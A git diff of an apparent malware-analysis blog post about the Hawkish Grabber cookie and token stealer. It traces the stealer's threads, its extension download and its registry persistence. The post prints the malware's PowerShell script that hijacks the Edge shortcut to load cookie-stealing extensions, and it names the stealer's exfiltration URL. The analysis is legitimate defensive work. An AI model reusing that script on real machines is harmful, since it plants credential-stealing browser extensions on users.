@@ -53,9 +53,9 @@ Using ProcDot, we can actually target specific child processes and see what they
 
 ![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/4f51a841-ca9e-45c8-88a4-b1627767cea3)
 
-### PID-4320, AKA Hawkish Grabber
+### TID-6184, Hawkish Grabber
 
-After loading this specific PID, we can see some DLLs being loaded, some communications being made to some servers, one of them specifically stood out to me, ```185.199.117.133:443```. The ```TIDs: 7068, 9708, 2984, and 7952``` were being used to download a zip file called ```"extensions.zip"```. Eventually, ```TIDs: 7068 and 7952``` both start reading data from the ZIP file then start writing data to the following folders:
+After this specific TID is created, we can see some DLLs being loaded, some communications being made to some servers, one of them specifically stood out to me, ```185.199.117.133:443```. The ```Child TIDs: 7068, 9708, 2984, and 7952``` were being used to download a zip file called ```"extensions.zip"```. Eventually, ```TIDs: 7068 and 7952``` both start reading data from the ZIP file then start writing data to the following folders:
 
 ```C:\ProgramData\ChromeExtensionsNova\extension-cookies```
 
@@ -90,4 +90,44 @@ The other folder, ```C:\ProgramData\ChromeExtensionsNova\extension-cookies``` is
 ![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/76a298ee-25cd-4f7d-9a04-61c75b61f391)
 
 ^^^ ```background.js``` script found inside ```C:\ProgramData\ChromeExtensionsNova\extension-cookies\scripts\``` ^^^
+
+After the ZIP file is completely unpacked, it is deleted:
+
+![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/f10c0b2e-5e8f-4748-8653-d22a5e48927e)
+
+Daddy TID ```6184``` then creates a new PS1 file called ```salutzasYm.ps1```
+
+![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/61b33229-c7d6-40a8-9e75-7bf496f19a42)
+
+This file has the following contents:
+
+```
+$WshShell = New-Object -comObject WScript.Shell;
+$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk");
+$Shortcut.Arguments = "--load-extension=C:\ProgramData\ChromeExtensionsNova\extension-cookies,C:\ProgramData\ChromeExtensionsNova\extension-tokens";
+$Shortcut.Save()
+```
+
+This script is adding the extensions that were downloaded earlier into the default browser, once this is done, whenever the user opens their browser, it will auto redirect to Discord & Roblox and inject the cookie stealer which will steal the cookies and send it to the Hawkish Grabber API link seen earlier: ```https://hawkish.eu/grabber/nova/TkoCCyWOcryKWiOgbvNVgqBnekAvNhrIzrFdfPpknSHwnOQTqBxJWYDSkWhr```
+
+Then the TID ```6184``` makes another persistent registry key for ```cmd.exe```, probably to ensure the PS1 web injection script executes at startup.
+
+![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/421a2aaa-aaaa-43ce-b642-3adbe61b96fd)
+
+Later on it also makes one for ```powershell.exe```
+
+![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/a464f4a9-77b1-41b8-b7fe-09d2bbec2047)
+
+Inbetween that, TID ```6184``` also writes some data to the ```System Info.txt``` file
+
+![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/e571d0a5-4bca-4e7b-8c0e-2bfa45b4a9e4)
+
+NOTE, just incase you're confused with all the different TIDs being thrown around, TID ```6184``` is the main TID has been used for creating persistent registry keys, writing the stolen data to ```C:\Users\Analysis\AppData\Local\Temp\fMYoQic11EKsYaZdyub7``` (the ```fMYoQic11EKsYaZdyub7``` folder is randomly generated, and PID ```4320``` is the Parent Process that has created the Thread ID ```6184```, and finally, The ```Child TIDs: 7068, 9708, 2984, and 7952``` of which their Parent TID is 6184, were being used to download a zip file called ```"extensions.zip"```. But they will soon be used to write all of the stolen information inside ```C:\Users\Analysis\AppData\Local\Temp\fMYoQic11EKsYaZdyub7``` into a ZIP file called ```GB_NOVA_Analysis.zip``` (My computer name is Analysis, so it would be ```GB_NOVA_<YOUR-COMPUTER-NAME>.zip```)
+
+Here is the Process Hierarchy:
+
+- ```PID 4320``` = Main stealer process 
+- ```TID 6184 "TID Daddy"``` = Main thread created by stealer process to manage persistence and steal information
+- ```Child TIDs: 7068, 9708, 2984, and 7952``` = Child Threads created by "TID Daddy" used to download + setup the web injector that steals Discord Tokens & Roblox Cookies, and finally pack all stolen data into the ```GB_NOVA_Analysis.zip``` ZIP file.
+
 
